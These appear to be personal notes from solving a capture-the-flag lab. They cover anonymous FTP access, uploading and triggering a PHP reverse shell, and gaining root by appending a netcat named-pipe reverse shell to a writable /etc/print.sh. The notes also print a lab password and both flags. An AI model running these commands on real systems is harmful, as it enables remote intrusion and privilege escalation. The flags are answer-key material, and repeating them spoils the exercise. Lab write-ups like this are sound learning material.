#found anonymous login in ftp port

#got 2 files a note and a jpg image file

#note:
	Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

#possible username found:
	maya

#enumerated directories on webpage

#found the ftp folder

#used the PUT command to add the reverse-shell.php in the ftp folder:
	put reverse-shell.php

#execute it using the /files folder found on the webpage

#found a reciepie.txt:
	Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.

#also found a folder incident in /

#contains a suspicious.pcap file

#moved it to /ftp/files so i can download on localmachine

#found pass for lennie:
	c4ntg3t3n0ughsp1c3.

#found user flag:
	THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

#found concern.txt in Documents folder:
	I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie

#found list.txt in Documents folder:
	Shoppinglist: Cyberpunk 2077 | Milk | Dog food

#found note.txt in Documents folder:
	Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.

#found starter_list.txt in Scripts folder:
	empty

#found a script called planner.sh:
	#!/bin/bash
	echo $LIST > /home/lennie/scripts/startup_list.txt
	/etc/print.sh

#looked over to /etc/print.sh

#writeable

#added a reverse shell line to print.sh
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.252.17 9001 >/tmp/f" >> /etc/print.sh

#used the command:
	sh /etc/print.sh

#got root!

#root flag:
	THM{f963aaa6a430f210222158ae15c3d76d}